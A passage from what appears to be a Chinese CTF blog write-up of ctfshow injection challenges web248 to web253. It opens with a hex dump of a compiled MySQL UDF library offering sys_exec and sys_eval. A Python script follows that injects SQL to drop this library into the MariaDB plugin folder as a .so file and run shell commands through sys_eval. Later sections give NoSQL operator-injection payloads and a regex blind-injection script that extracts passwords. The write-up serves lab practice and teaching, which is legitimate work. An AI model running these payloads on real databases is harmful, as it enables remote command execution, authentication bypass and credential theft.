548897DF8C9C3554889E54883EC2048897DF8488975F0488955E848894DE0488B45F0488B4010488B004889C7E882FAFFFF4898C9C3554889E54883EC3048897DE8488975E0488955D8C745FC00000000488B45E08B0083F801751F488B45E0488B40088B55FC48C1E2024801D08B0085C07507B800000000EB20488D0D22020000488B45D8BA2B0000004889CE4889C7E87EFAFFFFB801000000C9C3554889E548897DF8C9C3554889E54881EC500400004889BDD8FBFFFF4889B5D0FBFFFF488995C8FBFFFF48898DC0FBFFFF4C8985B8FBFFFF4C898DB0FBFFFFBF01000000E8BEF9FFFF488985C8FBFFFF48C745F000000000488B85D0FBFFFF488B4010488B00488D352C0200004889C7E852FAFFFF488945E8EB63488D85E0FBFFFF4889C7E8BDF9FFFF488945F8488B45F8488B55F04801C2488B85C8FBFFFF4889D64889C7E80CFAFFFF488985C8FBFFFF488D85E0FBFFFF488B55F0488B8DC8FBFFFF4801D1488B55F84889C64889CFE8D1F9FFFF488B45F8480145F0488B55E8488D85E0FBFFFFBE000400004889C7E831F9FFFF4885C07580488B45E84889C7E850F9FFFF488B85C8FBFFFF0FB60084C0740A4883BDC8FBFFFF00750C488B85B8FBFFFFC60001EB2B488B45F0488B95C8FBFFFF488D0402C60000488B85C8FBFFFF4889C7E8FBF8FFFF488B95C0FBFFFF488902488B85C8FBFFFFC9C39090909090909090554889E5534883EC08488B05A80320004883F8FF7419488D1D9B0320000F1F004883EB08FFD0488B034883F8FF75F14883C4085BC9C390904883EC08E84FF9FFFF4883C408C300004E6F20617267756D656E747320616C6C6F77656420287564663A206C69625F6D7973716C7564665F7379735F696E666F29000000000000006C69625F6D7973716C7564665F7379732076657273696F6E20302E302E33000045787065637465642065786163746C79206F6E6520737472696E67207479706520706172616D6574657200000000000045787065637465642065786163746C792074776F20617267756D656E74730000457870656374656420737472696E67207479706520666F72206E616D6520706172616D6574657200436F756C64206E6F7420616C6C6F63617465206D656D6F7279007200011B033B800000000F00000008F9FFFF9C00000051F9FFFFBC0000005BF9FFFFDC000000A7F9FFFFFC00000004FAFFFF1C0100000EFAFFFF3C01000071FAFFFF5C01000062FBFFFF7C0100008DFBFFFF9C0100005EFCFFFFBC010000C5FCFFFFDC010000CFFCFFFFFC010000FEFCFFFF1C02000065FDFFFF3C0200006FFDFFFF5C0200001400000000000000017A5200017810011B0C0708900100001C0000001C00000064F8FFFF4900000000410E108602430D0602440C070800001C0000003C0000008DF8FFFF0A00000000410E108602430D06450C07080000001C0000005C00000077F8FFFF4C00000000410E108602430D0602470C070800001C0000007C000000A3F8FFFF5D00000000410E108602430D0602580C070800001C0000009C000000E0F8FFFF0A00000000410E108602430D06450C07080000001C000000BC000000CAF8FFFF6300000000410E108602430D06025E0C070800001C000000DC0000000DF9FFFFF100000000410E108602430D0602EC0C070800001C000000FC000000DEF9FFFF2B00000000410E108602430D06660C07080000001C0000001C010000E9F9FFFFD100000000410E108602430D0602CC0C070800001C0000003C0100009AFAFFFF6700000000410E108602430D0602620C070800001C0000005C010000E1FAFFFF0A00000000410E108602430D06450C07080000001C0000007C010000CBFAFFFF2F00000000410E108602430D066A0C07080000001C0000009C010000DAFAFFFF6700000000410E108602430D0602620C070800001C000000BC01000021FBFFFF0A00000000410E108602430D06450C07080000001C000000DC0100000BFBFFFF5501000000410E108602430D060350010C0708000000000000000000FFFFFFFFFFFFFFFF0000000000000000FFFFFFFFFFFFFFFF00000000000000000000000000000000F01420000000000001000000000000006F010000000000000C0000000000000088090000000000000D000000000000004811000000000000F5FEFF6F00000000B8010000000000000500000000000000E805000000000000060000000000000070020000000000000A000000000000009D010000000000000B000000000000001800000000000000030000000000000090162000000000000200000000000000380100000000000014000000000000000700000000000000170000000000000050080000000000000700000000000000F0070000000000000800000000000000600000000000000009000000000000001800000000000000FEFFFF6F00000000D007000000000000FFFFFF6F000000000100000000000000F0FFFF6F000000008607000000000000F9FFFF6F0000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000F81420000000000000000000000000000000000000000000B609000000000000C609000000000000D609000000000000E609000000000000F609000000000000060A000000000000160A000000000000260A000000000000360A000000000000460A000000000000560A000000000000660A000000000000760A0000000000004743433A2028474E552920342E342E3720323031323033313320285265642048617420342E342E372D3429004743433A2028474E552920342E342E3720323031323033313320285265642048617420342E342E372D31372900002E73796D746162002E737472746162002E7368737472746162002E6E6F74652E676E752E6275696C642D6964002E676E752E68617368002E64796E73796D002E64796E737472002E676E752E76657273696F6E002E676E752E76657273696F6E5F72002E72656C612E64796E002E72656C612E706C74002E696E6974002E74657874002E66696E69002E726F64617461002E65685F6672616D655F686472002E65685F6672616D65002E63746F7273002E64746F7273002E6A6372002E646174612E72656C2E726F002E64796E616D6963002E676F74002E676F742E706C74002E627373002E636F6D6D656E7400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001B0000000700000002000000000000009001000000000000900100000000000024000000000000000000000000000000040000000000000000000000000000002E000000F6FFFF6F0200000000000000B801000000000000B801000000000000B400000000000000030000000000000008000000000000000000000000000000380000000B000000020000000000000070020000000000007002000000000000780300000000000004000000020000000800000000000000180000000000000040000000030000000200000000000000E805000000000000E8050000000000009D0100000000000000000000000000000100000000000000000000000000000048000000FFFFFF6F0200000000000000860700000000000086070000000000004A0000000000000003000000000000000200000000000000020000000000000055000000FEFFFF6F0200000000000000D007000000000000D007000000000000200000000000000004000000010000000800000000000000000000000000000064000000040000000200000000000000F007000000000000F00700000000000060000000000000000300000000000000080000000000000018000000000000006E000000040000000200000000000000500800000000000050080000000000003801000000000000030000000A000000080000000000000018000000000000007800000001000000060000000000000088090000000000008809000000000000180000000000000000000000000000000400000000000000000000000000000073000000010000000600000000000000A009000000000000A009000000000000E0000000000000000000000000000000040000000000000010000000000000007E000000010000000600000000000000800A000000000000800A000000000000C80600000000000000000000000000001000000000000000000000000000000084000000010000000600000000000000481100000000000048110000000000000E000000000000000000000000000000040000000000000000000000000000008A00000001000000020000000000000058110000000000005811000000000000EC0000000000000000000000000000000800000000000000000000000000000092000000010000000200000000000000441200000000000044120000000000008400000000000000000000000000000004000000000000000000000000000000A0000000010000000200000000000000C812000000000000C812000000000000FC01000000000000000000000000000008000000000000000000000000000000AA000000010000000300000000000000C814200000000000C8140000000000001000000000000000000000000000000008000000000000000000000000000000B1000000010000000300000000000000D814200000000000D8140000000000001000000000000000000000000000000008000000000000000000000000000000B8000000010000000300000000000000E814200000000000E8140000000000000800000000000000000000000000000008000000000000000000000000000000BD000000010000000300000000000000F014200000000000F0140000000000000800000000000000000000000000000008000000000000000000000000000000CA000000060000000300000000000000F814200000000000F8140000000000008001000000000000040000000000000008000000000000001000000000000000D3000000010000000300000000000000781620000000000078160000000000001800000000000000000000000000000008000000000000000800000000000000D8000000010000000300000000000000901620000000000090160000000000008000000000000000000000000000000008000000000000000800000000000000E1000000080000000300000000000000101720000000000010170000000000001000000000000000000000000000000008000000000000000000000000000000E60000000100000030000000000000000000000000000000101700000000000059000000000000000000000000000000010000000000000001000000000000001100000003000000000000000000000000000000000000006917000000000000EF00000000000000000000000000000001000000000000000000000000000000010000000200000000000000000000000000000000000000581F00000000000068070000000000001B0000002C00000008000000000000001800000000000000090000000300000000000000000000000000000000000000C02600000000000042030000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000003000100900100000000000000000000000000000000000003000200B80100000000000000000000000000000000000003000300700200000000000000000000000000000000000003000400E80500000000000000000000000000000000000003000500860700000000000000000000000000000000000003000600D00700000000000000000000000000000000000003000700F00700000000000000000000000000000000000003000800500800000000000000000000000000000000000003000900880900000000000000000000000000000000000003000A00A00900000000000000000000000000000000000003000B00800A00000000000000000000000000000000000003000C00481100000000000000000000000000000000000003000D00581100000000000000000000000000000000000003000E00441200000000000000000000000000000000000003000F00C81200000000000000000000000000000000000003001000C81420000000000000000000000000000000000003001100D81420000000000000000000000000000000000003001200E81420000000000000000000000000000000000003001300F01420000000000000000000000000000000000003001400F81420000000000000000000000000000000000003001500781620000000000000000000000000000000000003001600901620000000000000000000000000000000000003001700101720000000000000000000000000000000000003001800000000000000000000000000000000000100000002000B00800A0000000000000000000000000000110000000400F1FF000000000000000000000000000000001C00000001001000C81420000000000000000000000000002A00000001001100D81420000000000000000000000000003800000001001200E81420000000000000000000000000004500000002000B00A00A00000000000000000000000000005B00000001001700101720000000000001000000000000006A00000001001700181720000000000008000000000000007800000002000B00200B0000000000000000000000000000110000000400F1FF000000000000000000000000000000008400000001001000D01420000000000000000000000000009100000001000F00C01400000000000000000000000000009F00000001001200E8142000000000000000000000000000AB00000002000B0010110000000000000000000000000000C10000000400F1FF00000000000000000000000000000000D40000000100F1FF90162000000000000000000000000000EA00000001001300F0142000000000000000000000000000F700000001001100E0142000000000000000000000000000040100000100F1FFF81420000000000000000000000000000D01000012000B00D10D000000000000D1000000000000001501000012000B00130F0000000000002F000000000000001E01000020000000000000000000000000000000000000002D01000020000000000000000000000000000000000000004101000012000C00481100000000000000000000000000004701000012000B00A90F0000000000000A000000000000005701000012000000000000000000000000000000000000006B01000012000000000000000000000000000000000000007F01000012000B00A20E00000000000067000000000000008D01000012000B00B30F0000000000005501000000000000960100001200000000000000000000000000000000000000A901000012000B00950B0000000000000A00000000000000C601000012000B00B50C000000000000F100000000000000D30100001200000000000000000000000000000000000000E50100001200000000000000000000000000000000000000F901000012000000000000000000000000000000000000000D02000012000B004C0B00000000000049000000000000002802000022000000000000000000000000000000000000004402000012000B00A60D0000000000002B000000000000005302000012000B00EB0B0000000000005D000000000000006002000012000B00480C0000000000000A000000000000006F02000012000000000000000000000000000000000000008302000012000B00420F0000000000006700000000000000910200001200000000000000000000000000000000000000A50200001200000000000000000000000000000000000000B902000012000B00520C0000000000006300000000000000C10200001000F1FF10172000000000000000000000000000CD02000012000B009F0B0000000000004C00000000000000E30200001000F1FF20172000000000000000000000000000E80200001200000000000000000000000000000000000000FD02000012000B00090F0000000000000A000000000000000D0300001200000000000000000000000000000000000000220300001000F1FF101720000000000000000000000000002903000012000000000000000000000000000000000000003C03000012000900880900000000000000000000000000000063616C6C5F676D6F6E5F73746172740063727473747566662E63005F5F43544F525F4C4953545F5F005F5F44544F525F4C4953545F5F005F5F4A43525F4C4953545F5F005F5F646F5F676C6F62616C5F64746F72735F61757800636F6D706C657465642E363335320064746F725F6964782E36333534006672616D655F64756D6D79005F5F43544F525F454E445F5F005F5F4652414D455F454E445F5F005F5F4A43525F454E445F5F005F5F646F5F676C6F62616C5F63746F72735F617578006C69625F6D7973716C7564665F7379732E63005F474C4F42414C5F4F46465345545F5441424C455F005F5F64736F5F68616E646C65005F5F44544F525F454E445F5F005F44594E414D4943007379735F736574007379735F65786563005F5F676D6F6E5F73746172745F5F005F4A765F5265676973746572436C6173736573005F66696E69007379735F6576616C5F6465696E6974006D616C6C6F634040474C4942435F322E322E350073797374656D4040474C4942435F322E322E35007379735F657865635F696E6974007379735F6576616C0066676574734040474C4942435F322E322E35006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974007379735F7365745F696E697400667265654040474C4942435F322E322E35007374726C656E4040474C4942435F322E322E350070636C6F73654040474C4942435F322E322E35006C69625F6D7973716C7564665F7379735F696E666F5F696E6974005F5F6378615F66696E616C697A654040474C4942435F322E322E35007379735F7365745F6465696E6974007379735F6765745F696E6974007379735F6765745F6465696E6974006D656D6370794040474C4942435F322E322E35007379735F6576616C5F696E697400736574656E764040474C4942435F322E322E3500676574656E764040474C4942435F322E322E35007379735F676574005F5F6273735F7374617274006C69625F6D7973716C7564665F7379735F696E666F005F656E64007374726E6370794040474C4942435F322E322E35007379735F657865635F6465696E6974007265616C6C6F634040474C4942435F322E322E35005F656461746100706F70656E4040474C4942435F322E322E35005F696E697400 &#x27;</span></span><br><span class="line">codes = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(code), <span class="number">128</span>):</span><br><span class="line">    codes.append(code[i:<span class="built_in">min</span>(i + <span class="number">128</span>, <span class="built_in">len</span>(code))])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">commit_payload</span>(<span class="params">payload: <span class="built_in">str</span></span>):</span><br><span class="line">    requests.get(url + <span class="string">f&#x27;&#x27;&#x27;0&#x27;;<span class="subst">&#123;payload&#125;</span>;-- A&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 第一次运行建临时表</span></span><br><span class="line"><span class="comment"># sql=&#x27;&#x27;&#x27;create table temp(data longblob)&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 清空临时表</span></span><br><span class="line">commit_payload(<span class="string">&#x27;&#x27;&#x27;delete from temp&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 插入第一段数据</span></span><br><span class="line">commit_payload(<span class="string">&#x27;&#x27;&#x27;insert into temp(data) values (0x&#123;&#125;)&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(codes[<span class="number">0</span>]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 更新连接剩余数据</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(codes)):</span><br><span class="line">    commit_payload(<span class="string">&#x27;&#x27;&#x27;update temp set data = concat(data,0x&#123;&#125;)&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(codes[k]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 10.3.18-MariaDB</span></span><br><span class="line"><span class="comment"># 写入so文件</span></span><br><span class="line">commit_payload(<span class="string">&#x27;&#x27;&#x27;select data from temp into dumpfile &#x27;/usr/lib/mariadb/plugin/udf.so\&#x27;&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 引入自定义函数</span></span><br><span class="line">commit_payload(<span class="string">&#x27;&#x27;&#x27;create function sys_eval returns string soname &#x27;udf.so\&#x27;&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 命令执行，结果更新到界面</span></span><br><span class="line">commit_payload(</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;update ctfshow_user set pass=(select sys_eval(&#x27;cat /flag.????&#x27;))&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看结果</span></span><br><span class="line">r = requests.get(url[:-<span class="number">4</span>] + <span class="string">&#x27;?page=1&amp;limit=10&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>
<p>返回结果中找到 flag。    </p>
<h2 id="web249"><a href="#web249" class="headerlink" title="web249"></a>web249</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//无</span></span><br><span class="line"><span class="variable">$user</span> = <span class="variable">$memcache</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="variable">$id</span>);</span><br><span class="line">      </span><br><span class="line"><span class="comment">//无过滤</span></span><br></pre></td></tr></table></figure>
<p>无过滤的 nosql 注入，尝试 <code>id=flag</code> 不行，id 都是数字，尝试数组绕过得到 flag。<br>payload: <code>id[]=flag</code></p>
<h2 id="web250"><a href="#web250" class="headerlink" title="web250"></a>web250</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$query</span> = <span class="keyword">new</span> MongoDB\Driver\<span class="title function_ invoke__">Query</span>(<span class="variable">$data</span>);</span><br><span class="line"><span class="variable">$cursor</span> = <span class="variable">$manager</span>-&gt;<span class="title function_ invoke__">executeQuery</span>(<span class="string">&#x27;ctfshow.ctfshow_user&#x27;</span>, <span class="variable">$query</span>)-&gt;<span class="title function_ invoke__">toArray</span>();</span><br><span class="line">      </span><br><span class="line"><span class="comment">//无过滤</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">count</span>(<span class="variable">$cursor</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;登陆成功&#x27;</span>;</span><br><span class="line">    <span class="title function_ invoke__">array_push</span>(<span class="variable">$ret</span>[<span class="string">&#x27;data&#x27;</span>], <span class="variable">$flag</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>无过滤的 nosql 注入。<br>MongoDB 中的条件操作符    </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$gt : &gt;</span><br><span class="line">$lt : &lt;</span><br><span class="line"><span class="attr">$gte</span>: &gt;=</span><br><span class="line"><span class="attr">$lte</span>: &lt;=</span><br><span class="line">$ne : !=、&lt;&gt;</span><br><span class="line">$in : <span class="keyword">in</span></span><br><span class="line"><span class="attr">$nin</span>: not <span class="keyword">in</span></span><br><span class="line"><span class="attr">$all</span>: all </span><br><span class="line"><span class="attr">$or</span>:  or</span><br><span class="line"><span class="attr">$not</span>: 反匹配(<span class="number">1.3</span><span class="number">.3</span>及以上版本)</span><br><span class="line">模糊查询用正则式：db.<span class="property">customer</span>.<span class="title function_">find</span>(&#123;<span class="string">&#x27;name&#x27;</span>: &#123;<span class="string">&#x27;$regex&#x27;</span>:<span class="string">&#x27;.*s.*&#x27;</span>&#125; &#125;)</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* : 范围查询 &#123; &quot;age&quot; : &#123; &quot;$gte&quot; : 2 , &quot;$lte&quot; : 21&#125;&#125;</span></span><br><span class="line"><span class="comment">* : $ne &#123; &quot;age&quot; : &#123; &quot;$ne&quot; : 23&#125;&#125;</span></span><br><span class="line"><span class="comment">* : $lt &#123; &quot;age&quot; : &#123; &quot;$lt&quot; : 23&#125;&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
<p>故构造 <code>$data = array(&quot;username&quot; =&gt; array(&quot;\$ne&quot; =&gt; 1), &quot;password&quot; =&gt; array(&quot;\$ne&quot; =&gt; 1));</code> 绕过判断。<br>payload: <code>username[$ne]=1&amp;password[$ne]=1</code>    </p>
<h2 id="web251"><a href="#web251" class="headerlink" title="web251"></a>web251</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$query</span> = <span class="keyword">new</span> MongoDB\Driver\<span class="title function_ invoke__">Query</span>(<span class="variable">$data</span>);</span><br><span class="line"><span class="variable">$cursor</span> = <span class="variable">$manager</span>-&gt;<span class="title function_ invoke__">executeQuery</span>(<span class="string">&#x27;ctfshow.ctfshow_user&#x27;</span>, <span class="variable">$query</span>)-&gt;<span class="title function_ invoke__">toArray</span>();</span><br><span class="line">      </span><br><span class="line"><span class="comment">//无过滤</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">count</span>(<span class="variable">$cursor</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;登陆成功&#x27;</span>;</span><br><span class="line">    <span class="title function_ invoke__">array_push</span>(<span class="variable">$ret</span>[<span class="string">&#x27;data&#x27;</span>], <span class="variable">$flag</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>无过滤的 nosql 注入。<br>继续用上一题的 payload，返回 admin 的密码，但是这次的密码里没有 flag，改成 <code>array(&quot;$ne&quot; =&gt; &quot;admin&quot;)</code> 后密码处出现 flag。<br>payload: <code>username[$ne]=admin&amp;password[$ne]=1</code>    </p>
<h2 id="web252"><a href="#web252" class="headerlink" title="web252"></a>web252</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//sql</span></span><br><span class="line">db.ctfshow_user.<span class="title function_ invoke__">find</span>(&#123;username:<span class="string">&#x27;$username&#x27;</span>,password:<span class="string">&#x27;$password&#x27;</span>&#125;).<span class="title function_ invoke__">pretty</span>()</span><br><span class="line">      </span><br><span class="line"><span class="comment">//无过滤</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">count</span>(<span class="variable">$cursor</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;登陆成功&#x27;</span>;</span><br><span class="line">    <span class="title function_ invoke__">array_push</span>(<span class="variable">$ret</span>[<span class="string">&#x27;data&#x27;</span>], <span class="variable">$flag</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>无过滤的 nosql 注入。<br>继续用上一题的 payload，又出来个 admin1，同时还不能是 admin，正则绕过<br>payload: <code>username[$regex]=^[^a].*&amp;password[$ne]=1</code>    </p>
<h2 id="web253"><a href="#web253" class="headerlink" title="web253"></a>web253</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//sql</span></span><br><span class="line">db.ctfshow_user.<span class="title function_ invoke__">find</span>(&#123;username:<span class="string">&#x27;$username&#x27;</span>,password:<span class="string">&#x27;$password&#x27;</span>&#125;).<span class="title function_ invoke__">pretty</span>()</span><br><span class="line">      </span><br><span class="line"><span class="comment">//无过滤</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">count</span>(<span class="variable">$cursor</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;登陆成功&#x27;</span>;</span><br><span class="line">    <span class="title function_ invoke__">array_push</span>(<span class="variable">$ret</span>[<span class="string">&#x27;data&#x27;</span>], <span class="variable">$flag</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>无过滤的 nosql 注入，再尝试用之前的 payload，登录成功但没有返回数据了。<br>脑洞 username 是 flag，<code>username[$regex]=flag&amp;password[$ne]=1</code> 可以登录成功，写个脚本正则布尔盲注密码。    </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://5ce4ea0d-afb5-4f1c-9e65-626bdaa6e433.challenge.ctf.show:8080/api/&quot;</span></span><br><span class="line"></span><br><span class="line">letters = <span class="string">&quot;&#123;&#125;-_&quot;</span> + string.ascii_lowercase + string.digits</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">valid_pass</span>(<span class="params">password: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;username[$regex]&quot;</span>: <span class="string">&quot;flag&quot;</span>,</span><br><span class="line">        <span class="string">&quot;password[$regex]&quot;</span>: <span class="string">f&quot;<span class="subst">&#123;password&#125;</span>.*&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    response = requests.post(url, data=data)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;登陆成功&quot;</span> <span class="keyword">in</span> response.json()[<span class="string">&quot;msg&quot;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">for</span> letter <span class="keyword">in</span> letters:</span><br><span class="line">        <span class="keyword">if</span> valid_pass(result + letter):</span><br><span class="line">            result += letter</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[*] result: <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p>至此 sql 注入篇结束。</p>

  </div>
</article>

    <div class="blog-post-comments">
        <div id="disqus_thread">
            <noscript>Please enable JavaScript to view the comments.</noscript>
        </div>
    </div>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/links/">links</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#web171"><span class="toc-number">1.</span> <span class="toc-text">web171</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web172"><span class="toc-number">2.</span> <span class="toc-text">web172</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web173"><span class="toc-number">3.</span> <span class="toc-text">web173</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web174"><span class="toc-number">4.</span> <span class="toc-text">web174</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web175"><span class="toc-number">5.</span> <span class="toc-text">web175</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web176"><span class="toc-number">6.</span> <span class="toc-text">web176</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web177"><span class="toc-number">7.</span> <span class="toc-text">web177</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web178"><span class="toc-number">8.</span> <span class="toc-text">web178</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web179"><span class="toc-number">9.</span> <span class="toc-text">web179</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web180"><span class="toc-number">10.</span> <span class="toc-text">web180</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web181"><span class="toc-number">11.</span> <span class="toc-text">web181</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web182"><span class="toc-number">12.</span> <span class="toc-text">web182</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web183"><span class="toc-number">13.</span> <span class="toc-text">web183</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web184"><span class="toc-number">14.</span> <span class="toc-text">web184</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web185"><span class="toc-number">15.</span> <span class="toc-text">web185</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web186"><span class="toc-number">16.</span> <span class="toc-text">web186</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web187"><span class="toc-number">17.</span> <span class="toc-text">web187</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web188"><span class="toc-number">18.</span> <span class="toc-text">web188</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web189"><span class="toc-number">19.</span> <span class="toc-text">web189</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web190"><span class="toc-number">20.</span> <span class="toc-text">web190</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web191"><span class="toc-number">21.</span> <span class="toc-text">web191</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web192"><span class="toc-number">22.</span> <span class="toc-text">web192</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web193"><span class="toc-number">23.</span> <span class="toc-text">web193</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web194"><span class="toc-number">24.</span> <span class="toc-text">web194</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web195"><span class="toc-number">25.</span> <span class="toc-text">web195</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web196"><span class="toc-number">26.</span> <span class="toc-text">web196</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web197"><span class="toc-number">27.</span> <span class="toc-text">web197</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web198"><span class="toc-number">28.</span> <span class="toc-text">web198</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web199"><span class="toc-number">29.</span> <span class="toc-text">web199</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web200"><span class="toc-number">30.</span> 